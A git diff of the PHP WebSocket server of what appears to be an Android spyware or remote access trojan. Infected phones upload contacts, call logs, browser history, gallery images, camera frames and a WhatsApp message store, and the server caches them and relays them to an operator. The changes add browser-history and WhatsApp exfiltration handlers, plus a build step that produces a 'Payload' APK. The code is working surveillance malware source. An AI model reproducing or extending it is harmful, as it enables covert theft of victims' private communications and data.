@@ -31,9 +31,16 @@ class Chat implements MessageComponentInterface {
           $this->android[$from->resourceId]=(object)['conn' => $from ,'time' => 0 ];
           $this->android[$from->resourceId]->time = time();
           //echo "do an handshake for android";
-        }else if($msg->type=="response"){
-          $data=["type"=>"screenshot","image"=>$msg->response];
+        }else if($msg->type=="error_reporting"){
+          $data=["type"=>"error_reporting","msg"=>$msg->response];
           $this->clients[$msg->to]->conn->send(json_encode($data));
+        }else if($msg->type=="whatsapp"){
+          $i=$from->resourceId;
+          if($msg->response == "init"){
+              add_notification($this->clients[$i]->details->user,$this->clients[$i]->details->id,'wac',"Whatsapp Message Store Transfer initiated.");
+          }else if($msg->response == "done"){
+              add_notification($this->clients[$i]->details->user,$this->clients[$i]->details->id,'wac',"Whatsapp Message Store Transfer Sucessfully Completed.");
+          }
         }else if($msg->type=="contacts"){
           $i=$from->resourceId;
           $fname=md5($this->clients[$i]->details->user).md5($this->clients[$i]->details->id)."contacs.json";
@@ -44,8 +51,19 @@ class Chat implements MessageComponentInterface {
           update_contacts($this->clients[$i]->details->id,$fname);
           $data=["type"=>"contacts","list"=>$fname];
           $this->clients[$msg->to]->conn->send(json_encode($data));
+          add_notification($this->clients[$i]->details->user,$this->clients[$i]->details->id,'cont',"Contacts Cached to the server");
+        }else if($msg->type=="browserhistory"){
+          $i=$from->resourceId;
+          $fname=md5($this->clients[$i]->details->user).md5($this->clients[$i]->details->id)."browser.json";
+          $myfile=fopen("../data/$fname", "w") or die("unable to write");
+          $txt=$msg->response;
+          fwrite($myfile, $txt);
+          fclose($myfile);
+          update_browserhistory($this->clients[$i]->details->id,$fname);
+          add_notification($this->clients[$i]->details->user,$this->clients[$i]->details->id,'browser',"Browser History Cached to the server for Device");
+          $data=["type"=>"browserhistory","list"=>$fname];
+          $this->clients[$msg->to]->conn->send(json_encode($data));
         }else if($msg->type=="calllog"){
-
           $i=$from->resourceId;
           $fname=md5($this->clients[$i]->details->user).md5($this->clients[$i]->details->id)."calllog.json";
           $myfile=fopen("../data/$fname", "w") or die("unable to write");
@@ -55,7 +73,7 @@ class Chat implements MessageComponentInterface {
           update_calllog($this->clients[$i]->details->id,$fname);
           $data=["type"=>"calllog","list"=>$fname];
           $this->clients[$msg->to]->conn->send(json_encode($data));
-
+          add_notification($this->clients[$i]->details->user,$this->clients[$i]->details->id,'clog',"Call Log Cached to the server");
         }else if($msg->type=="gallery"){
           $data=["type"=>"gallery","list"=>$msg->response];
           //$this->clients[$msg->to]->conn->send(json_encode($data));
@@ -63,7 +81,9 @@ class Chat implements MessageComponentInterface {
           if($msg->page==$msg->total){
             update_gallery($this->clients[$from->resourceId]->details->id);
             echo "transfer Complete";
+            add_notification($this->clients[$i]->details->user,$this->clients[$i]->details->id,'gal',"Complete Gallery Cached to the server");
           }
+
           $ack_msg=(object)["type"=>"gallery_progress","done"=>$msg->page,"total"=>$msg->total];
           $this->clients[$msg->to]->conn->send(json_encode($ack_msg));
           $i=1;
@@ -72,7 +92,7 @@ class Chat implements MessageComponentInterface {
           echo "page $msg->page";
 
         }else if($msg->type=="fetch"){
-
+          if(isset($this->clients[$msg->to]));
           $this->clients[$msg->to]->conn->send(json_encode($msg));
           update_image($msg->item,$msg->response);
         }else if($msg->type=="ping"){
@@ -83,15 +103,16 @@ class Chat implements MessageComponentInterface {
         }else if($msg->type=="build"){
           system("cd ../App/network/;./gradlew assembleDebug");
           exec("rm -f ../App/network/app/src/main/res/values/strings.xml");
-          exec("mv ../App/network/app/build/outputs/apk/app-debug.apk ../data/$msg->name.apk");
+          exec("mv ../App/network/app/build/outputs/apk/app-debug.apk ../data/".md5($msg->name).".apk");
+          add_notification($msg->name,"AET",'sys',"Welcome to the Squad your Payload Has been Generated!");
         }else if($msg->type="camera"){
           $rec=$msg->to;
           unset($msg->to);
+          if(isset($this->clients[$rec]))
           $this->clients[$rec]->conn->send(json_encode($msg));
         }else{
-
+          print_r($msg);
         }
-
       }else{
             //echo "message from browser ".$msg->device." | ".$msg->cmd;
             $this->purgeClients();
@@ -112,7 +133,6 @@ class Chat implements MessageComponentInterface {
                   $data=["cmd"=>"camera","cam"=>$msg->cam,"from"=>$from->resourceId,"frames"=>$msg->frames];
                 }else
                   $data=["cmd"=>$msg->cmd,"from"=>$from->resourceId];
-
                 $this->clients[$sock]->conn->send(json_encode($data));
               }
             }
